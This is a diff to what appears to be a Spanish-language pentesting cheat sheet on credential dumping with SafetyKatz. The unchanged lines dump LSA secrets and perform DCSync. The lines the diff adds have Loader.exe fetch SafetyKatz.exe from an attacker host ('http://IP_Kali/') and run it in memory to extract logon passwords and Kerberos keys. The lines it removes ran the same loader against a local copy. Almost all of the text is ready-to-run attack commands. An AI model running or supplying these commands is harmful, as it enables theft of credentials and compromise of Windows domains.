@@ -23,10 +23,9 @@ Nota: normalmente el nombre de la herramienta es SafetyKatz.
 ❯ .\SafetyKatz.exe -Command "lsadump::evasive-lsa /patch" exit
 ❯ .\SafetyKatz.exe -Command "lsadump::evasive-dcsync" exit 
 
-
-❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
-❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 
-
+❯ .\Loader.exe -path http://IP_Kali/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+❯ .\Loader.exe -path http://IP_Kali/SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit"
+❯ .\Loader.exe -path http://IP_Kali/SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 
 ```
 
 ## Mimikatz
